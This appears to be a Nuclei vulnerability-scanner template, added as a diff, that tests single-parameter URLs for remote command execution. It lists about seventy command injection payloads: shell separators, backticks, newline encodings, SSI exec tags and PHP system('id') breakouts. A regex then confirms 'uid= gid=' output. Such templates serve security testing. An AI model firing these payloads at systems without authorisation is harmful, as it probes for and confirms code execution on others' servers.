@@ -1,0 +1,91 @@
+id: RCE
+
+#USUAGE     $ echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t rce.yaml | awk '{print $6}'
+#Single parameter URLs only
+
+info:
+  name: RCE
+  author: 25
+  severity: high
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{payload}}"
+
+    payloads:
+       payload: 
+        - 'id'
+        - '| id'
+        - '; id'
+        - '& id'
+        - '|| id'
+        - '&& id'
+        - '$(id)'
+        - '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;'
+        - '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;'
+        - '/index.html|id|'
+        - ';id;'
+        - ';id'
+        - '|/usr/bin/id'
+        - '|id|'
+        - '|/usr/bin/id|'
+        - '||/usr/bin/id|'
+        - '|id;'
+        - '||/usr/bin/id;'
+        - ';id|'
+        - ';|/usr/bin/id|'
+        - '\n/usr/bin/id\n'
+        - '\nid\n'
+        - '\n/usr/bin/id;'
+        - '\nid;'
+        - '\n/usr/bin/id|'
+        - '\nid|'
+        - ';/usr/bin/id\n'
+        - ';id\n'
+        - '|usr/bin/id\n'
+        - '|nid\n'
+        - '`id`'
+        - '`/usr/bin/id`'
+        - 'a);id'
+        - 'a;id'
+        - 'a);id;'
+        - 'a;id;'
+        - 'a);id|'
+        - 'a;id|'
+        - 'a)|id'
+        - 'a|id'
+        - 'a)|id;'
+        - 'a|id'
+        - 'a);/usr/bin/id'
+        - 'a;/usr/bin/id'
+        - 'a);/usr/bin/id;'
+        - 'a;/usr/bin/id;'
+        - 'a);/usr/bin/id|'
+        - 'a;/usr/bin/id|'
+        - 'a)|/usr/bin/id'
+        - 'a|/usr/bin/id'
+        - 'a)|/usr/bin/id;'
+        - 'a|/usr/bin/id'
+        - ";system('id')"
+        - ";system('/usr/bin/id')"
+        - '%0A/usr/bin/id'
+        - '%0Aid'
+        - '%0A/usr/bin/id%0A'
+        - '%0Aid%0A'
+        - '%0a id %0a'
+        - '$;/usr/bin/id'
+        - '<!--#exec cmd="/usr/bin/id;-->'
+        - '<?php system("id");?>'
+        - '".system(%27id%27); $dummy="'
+        - '".system(%27id%27);#'
+        - '".system(%27id%27);//'
+        - '"%2B`id`%2B"'
+        
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        regex:
+          - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
+        part: body
